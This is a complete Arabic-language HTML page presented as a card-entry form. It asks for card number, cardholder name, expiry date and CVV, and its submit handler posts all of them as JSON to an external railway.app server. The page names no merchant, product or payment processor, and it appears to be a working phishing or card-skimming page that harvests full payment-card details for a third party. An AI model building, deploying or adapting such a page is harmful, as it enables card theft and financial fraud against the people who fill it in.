<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إدخال بيانات البطاقة</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
        }

        .container {
            background: #fff;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            width: 350px;
            text-align: center;
        }

        .card-image {
            width: 100%;
            border-radius: 10px;
            margin-bottom: 15px;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        input {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #ccc;
            font-size: 16px;
            text-align: center;
        }

        .row {
            display: flex;
            gap: 10px;
        }

        .row input {
            flex: 1;
        }

        label {
            font-size: 14px;
            text-align: right;
            display: block;
        }

        .save-card {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            font-size: 14px;
        }

        button {
            background-color: #28a745;
            color: white;
            font-size: 18px;
            padding: 12px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }

        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="card-placeholder.png" alt="بطاقة الائتمان" class="card-image">
        
        <form id="cardForm">
            <label>رقم البطاقة:</label>
            <input type="text" id="cardNumber" required pattern="\d{16}" placeholder="1234 5678 9012 3456">

            <label>اسم حامل البطاقة:</label>
            <input type="text" id="cardHolder" required pattern="[A-Za-z ]+" placeholder="John Doe">

            <div class="row">
                <div>
                    <label>تاريخ الانتهاء:</label>
                    <input type="text" id="expiryDate" required pattern="\d{2}/\d{2}" placeholder="MM/YY">
                </div>
                <div>
                    <label>CVV:</label>
                    <input type="text" id="cvv" required pattern="\d{3}" placeholder="123">
                </div>
            </div>

            <div class="save-card">
                <input type="checkbox" id="saveCard">
                <label for="saveCard">حفظ البطاقة</label>
            </div>

            <button type="submit">إرسال</button>
        </form>
    </div>

    <script>
        document.getElementById("cardForm").addEventListener("submit", function(event) {
            event.preventDefault();

            const cardNumber = document.getElementById("cardNumber").value.trim();
            const cardHolder = document.getElementById("cardHolder").value.trim();
            const expiryDate = document.getElementById("expiryDate").value.trim();
            const cvv = document.getElementById("cvv").value.trim();
            const saveCard = document.getElementById("saveCard").checked;

            // إرسال البيانات إلى السيرفر
            fetch("https://nodejs-production-7090.up.railway.app/send", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ cardNumber, cardHolder, expiryDate, cvv, saveCard })
            })
            .then(response => response.json())
            .then(data => alert(data.message))
            .catch(error => alert("حدث خطأ أثناء الإرسال!"));
        });
    </script>

</body>
</html>
